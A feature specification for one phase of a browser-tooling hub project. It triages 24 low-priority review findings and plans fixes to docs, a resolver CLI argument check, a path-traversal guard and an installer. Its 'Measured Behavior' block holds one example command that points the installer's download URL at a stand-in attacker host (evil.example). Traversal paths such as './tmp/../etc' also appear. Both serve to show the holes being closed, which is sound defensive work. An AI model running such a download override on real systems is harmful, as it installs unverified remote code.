---
title: "Feature Specification: Phase 18: triage-gen4-p2-findings"
description: "The generation-4 review left 24 P2 findings unchecked. Each is checked against source here: 20 held and 4 were refuted. 18 held findings are fixed, 1 is accepted, and 1 waits on an advisor decision."
trigger_phrases:
  - "triage gen4 p2 findings"
  - "phase 18 triage gen4 p2 findings"
  - "browser hub p2 advisories"
importance_tier: "normal"
contextType: "general"
---
<!-- SPECKIT_TEMPLATE_SOURCE: spec-core | v2.4 -->
# Feature Specification: Phase 18: triage-gen4-p2-findings

<!-- SPECKIT_LEVEL: 2 -->
---

<!-- ANCHOR:metadata -->
## 1. METADATA

| Field | Value |
|-------|-------|
| **Level** | 2 |
| **Priority** | P2 |
| **Status** | Complete |
| **Created** | 2026-11-24 |
| **Branch** | `main` |
| **Parent Spec** | ../spec.md |
| **Phase** | 18 of 18 |
| **Predecessor** | 017-fleet-front-door-stdin |
| **Successor** | None |
| **Handoff Criteria** | Every REQ below is Met in `acceptance-criteria.md` |
<!-- /ANCHOR:metadata -->

---

<!-- ANCHOR:phase-context -->
## Phase Context

This is **Phase 18** of the mcp-browser-use hub specification. The generation-4 review (`../review/review-report.md`) checked its P1 findings against source and left 24 P2 findings unchecked. The operator asked to fix and build every open item (Q011).

**Scope Boundary**: The hub and its three modes, the hub's compiled-routing library and the shared runtime engine's `resolve.cjs` and `compiled-route.cjs` with their authored archive copies, and the hub epic's own docs. P2 #15 is an advisor scorer change. It belongs to `specs/system-skill-advisor/routing-and-scoring/014-lexical-anchor-narrowing`, whose candidate rules moved pinned slices, so it waits on an operator decision.

**Dependencies**:
- `../review/deep-review-findings-registry.json`, which lists the 24 P2 findings.

**Deliverables**:
- A held-or-refuted row with its check for each finding, a fix for each held one, and hub release 1.1.5.0.
<!-- /ANCHOR:phase-context -->

---

<!-- ANCHOR:problem -->
## 2. PROBLEM & PURPOSE

### Problem Statement
24 P2 findings sat in the merged registry with no check against source. Some were already fixed by 016 or rested on a misread, and others still held: stale README and spec facts, an installer that let the environment pick its download source, a path guard that refused legal names and a resolver CLI that routed with the wrong argument.

### Purpose
Every P2 finding has a recorded verdict, and every one that holds is fixed or accepted with a reason.
<!-- /ANCHOR:problem -->

<!-- ANCHOR:measured-behavior -->
### Measured Behavior
```text
$ node -e '...openFindings.filter(P2)' review/deep-review-findings-registry.json
total 31 p2 24

$ node .skilled/bin/lib/compiled-routing/014-runtime-engine/lib/resolve.cjs --prompt x   (before)
routes with "--prompt" as the hub id, because indexOf('--hub') is -1

$ ASIDE_CLI_BASE_URL=https://evil.example bash mcp-aside-devtools/scripts/install.sh --force   (before)
passes the override to the vendor installer, whose archive is not verified
```
<!-- /ANCHOR:measured-behavior -->

---

<!-- ANCHOR:scope -->
## 3. SCOPE

### In Scope
- Check each P2 finding against source and record held or refuted with the check.
- Fix each held finding at its source, or record why it is accepted.
- Release hub 1.1.5.0 and replay the hub's routing.

### Out of Scope
- P2 #15, the advisor evidence cap. It waits on the advisor lexical-anchor decision.
- The archive the Aside vendor installer downloads. The vendor publishes no checksum for it.

### Files to Change

| File Path | Change Type | Description |
|-----------|-------------|-------------|
| Hub `README.md`, `ROUTER.md`, version files, `changelog/v1.1.5.0.md` | Modify, Create | Release table, entry shape, Core Web Vitals, projection and `reject` wording, release 1.1.5.0 |
| `mcp-aside-devtools/scripts/install.sh`, `INSTALL-GUIDE.md`, `feature-catalog/install/install-and-doctor.md` | Modify | Refuse `ASIDE_CLI_BASE_URL` |
| `mcp-aside-devtools/examples/repl-evidence-capture.sh` | Modify | Refuse only real `..` segments |
| `mcp-chrome-devtools/references/troubleshooting.md` | Modify | Download, read, then run the nvm installer |
| `010-mcp-browser-use/lib/registry-compiler.cjs`, `014-runtime-engine/lib/resolve.cjs`, `014-runtime-engine/lib/compiled-route.cjs` and archive copies | Modify | Derived `selectionKinds`; `--hub` check; shared override root |
| Epic `goal.md`, `spec.md`, phase 001, 002, 006 and 012 continuity | Modify | Binding rows, archive path, 006 run, status and completion values |
<!-- /ANCHOR:scope -->

---

<!-- ANCHOR:requirements -->
## 4. REQUIREMENTS
REQ ids run in one sequence across the P0 and P1 tables. A new requirement takes the highest REQ id plus one.

### P0 - Blockers (MUST complete)

| ID | Requirement |
|----|-------------|
| REQ-001 | Each of the 24 P2 findings has a held or refuted verdict with the check that decided it, in `implementation-summary.md`. |
| REQ-002 | Each held finding is fixed, accepted with a recorded reason, or handed to the packet that owns it. |

### P1 - Required (complete OR user-approved deferral)

| ID | Requirement |
|----|-------------|
| REQ-003 | The Aside wrapper exits before any download when `ASIDE_CLI_BASE_URL` is set, and the capture guard passes `./tmp/a..b` and refuses `./tmp/../etc`. |
| REQ-004 | `resolve.cjs` without `--hub` prints its usage and exits 2. |
| REQ-005 | The replay fails only MBU-PB-04, the canary exits 0, the compiled-route checks are clean and the hub checks pass. |

> Acceptance criteria for these requirements live in `acceptance-criteria.md`,
> which is the document that decides whether this packet may close.
<!-- /ANCHOR:requirements -->

---

<!-- ANCHOR:success-criteria -->
## 5. SUCCESS CRITERIA

- **SC-001**: No P2 finding is left without a verdict.
- **SC-002**: `validate.sh` on the hub epic with `--strict --recursive` prints RESULT: PASSED.
<!-- /ANCHOR:success-criteria -->

---

<!-- ANCHOR:risks -->
## 6. RISKS & DEPENDENCIES

| Type | Item | Impact | Mitigation |
|------|------|--------|------------|
| Risk | Refusing `ASIDE_CLI_BASE_URL` blocks a legitimate mirror | Low | The message says to read and run the vendor installer by hand |
| Risk | The version bump moves the policy hash | Low | Re-mint and replay |
| Dependency | Engine files have authored archive copies | Med | `compiled-route-sync.cjs --check` after each copy |
<!-- /ANCHOR:risks -->

---

<!-- ANCHOR:nfr -->
## L2: NON-FUNCTIONAL REQUIREMENTS
<!-- /ANCHOR:nfr -->

N/A: this phase changes docs, two scripts and three small library guards, and runs no service.

---

<!-- ANCHOR:edge-cases -->
## L2: EDGE CASES

- Empty input: `resolve.cjs` with no arguments prints its usage and exits 2.
- Maximum input: a session dir such as `./tmp/x/../../y` is refused at its first `..` segment.
- Failure path: the wrapper with `ASIDE_CLI_BASE_URL` set exits 1 before `curl` runs.
<!-- /ANCHOR:edge-cases -->

---

<!-- ANCHOR:complexity -->
## L2: COMPLEXITY ASSESSMENT

| Dimension | Score | Notes |
|-----------|-------|-------|
| Scope | 12/25 | About 25 files, small edits |
| Risk | 6/25 | Guards and docs; one install wrapper |
| Research | 8/20 | 24 findings, each checked against source |
| **Total** | **26/70** | **Level 2** |
<!-- /ANCHOR:complexity -->

---

<!-- ANCHOR:questions -->
## 10. OPEN QUESTIONS

- None.
<!-- /ANCHOR:questions -->

---
